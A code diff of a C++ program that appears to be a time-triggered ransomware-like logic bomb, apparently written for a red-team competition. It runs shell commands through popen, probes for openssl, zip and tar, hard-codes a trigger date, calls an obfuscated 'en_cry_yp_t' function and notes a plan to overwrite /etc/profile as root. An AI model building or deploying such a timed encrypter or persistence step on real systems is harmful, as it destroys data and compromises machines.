@@ -9,7 +9,7 @@ std::string ex_ec(const char* cmd){
 	char path[128];
 	std::string result = "";
 
-	/* open pipe (POSIX Dependant*/
+	/* open pipe (POSIX Dependant)*/
 	pipe = popen(cmd, "r");
 	if (pipe == NULL) {
 	    printf("Failed to run command\n" );
@@ -43,36 +43,43 @@ void en_cry_yp_t(std::string path){
 int main(){
     /* Check for current time */
     std::time_t t = std::time(nullptr);
-    std::tm * tm; // Datetime of target (Competition day at 12:00 EST)
+    std::tm * tm; // Datetime of target (Competition day at 12:00 EST) //Lunch
     bool openssl, zip, tar;
 	std::string out;
 
 	// check the local time 
+    // Remember, it must NOT be local time. Preferrably to UTC
+    // Competition is across several time zones
     tm = std::localtime(&t); 
 	
     openssl = contains(ex_ec("which openssl"),"openssl");
     zip = contains(ex_ec("which zip"),"zip");
     tar = contains(ex_ec("which tar"),"tar");
 
-	std::cout << openssl << std::endl;
-	std::cout << zip << std::endl;
-	std::cout << tar << std::endl;
+	//std::cout << openssl << std::endl;
+	//std::cout << zip << std::endl;
+	//std::cout << tar << std::endl;
 
-/*
-    //tm->tm_year = 2019;
-    //tm->tm_mon = 11;
-    //tm->tm_mday = 30;
+    // Time competition of trigger
+    tm->tm_year = 2019;
+    tm->tm_mon = 11;
+    tm->tm_mday = 16;
+    tm->tm_hour = 12;
+
+    tm->tm_year = 2019;
+    tm->tm_mon = 10;
+    tm->tm_mday = 21;
     std::cout << "Sleeping..." << std::endl;
     printf("sec: %o \n",tm->tm_sec % 15);
     printf("sec: %d \n",tm->tm_sec % 15);
 
-    while (tm->tm_sec % 15 != 0){
+    // At the start of every minute
+    while (tm->tm_sec != 0){
         t = std::time(nullptr);
-        tm = std::localtime(&t);
+        tm = std::localtime(&t); //Can't use this
         std::system("sleep 1");
         printf("sec: %d \n",tm->tm_sec % 16);
     }
-*/
 
     //printf("seconds past the minute: %d\n", tm->tm_sec);
     //std::cout << std::endl;
@@ -82,5 +89,6 @@ int main(){
 
     /* Run various system commands as root */
 	/* Open the command for reading. */
+    //System (overwrite /etc/profile)
     return 0;
 }
